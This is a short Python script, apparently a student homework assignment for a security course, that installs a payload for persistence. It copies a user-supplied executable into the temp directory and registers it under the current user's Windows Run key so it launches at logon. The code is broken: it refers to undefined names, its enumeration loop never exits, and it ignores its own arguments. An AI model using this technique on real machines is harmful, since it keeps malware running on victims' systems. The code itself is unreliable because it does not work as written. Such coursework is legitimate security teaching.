'''
Prachi Mishra
ppm1015@rit.edu
CSEC-473 Homework 3
Registry Persistence Tool
'''
import os
import winreg
import sys
#import subprocess

# Function to create a registry key and add it to the current user, creates a temp directory under the current user to store payload 
def reg_add(temp, filepath, runpath):
    os.system('copy %s %s'%(fileName, tempdir))
    key = OpenKey(winreg.HKEY_CURRENT_USER, run)
    runkey = []
    count = 0
    while True:
        keyval = winreg.EnumValue(key, count)
        runkey.append(keyval[0])
        count += 1
    
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key ,'payload', 0, winreg.REG_SZ, r"%TEMP%\payload.exe")
    key.Close()

# Main, creates string values for temporary and relative file paths frequently used
def main():
    temp = "%TEMP%"
    filepath = input("Enter payload filepath:  ")
    runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
    reg_add(temp, filepath, runpath)


if __name__ == "__main__":
        main()

